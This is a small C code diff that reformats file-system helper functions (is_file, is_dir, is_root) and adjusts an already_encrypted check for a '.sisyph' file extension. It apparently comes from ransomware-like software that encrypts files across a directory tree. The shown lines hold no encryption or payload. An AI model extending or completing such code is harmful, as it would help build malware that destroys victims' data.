@@ -20,9 +20,11 @@ bool is_file(struct dirent *entry) {
 }
 
 
+
 bool is_dir(struct dirent *entry) {
     return (entry->d_type == DT_DIR);
 }
+
 
 
 bool is_inode(struct dirent *entry) {
@@ -33,14 +35,16 @@ bool is_inode(struct dirent *entry) {
 }
 
 
+
 bool is_root(char *path) {
     return (strlen(path) == 1 && strncmp(path, "/", 1) == 0);
 }
 
 
+
 bool already_encrypted(char *path) {
     /* CRYPT_EXT it is '.sisyph' */
-    return strstr(path, CRYPT_EXT);
+    return strstr(path, CRYPT_EXT)? TRUE: FALSE;
 }
 
 
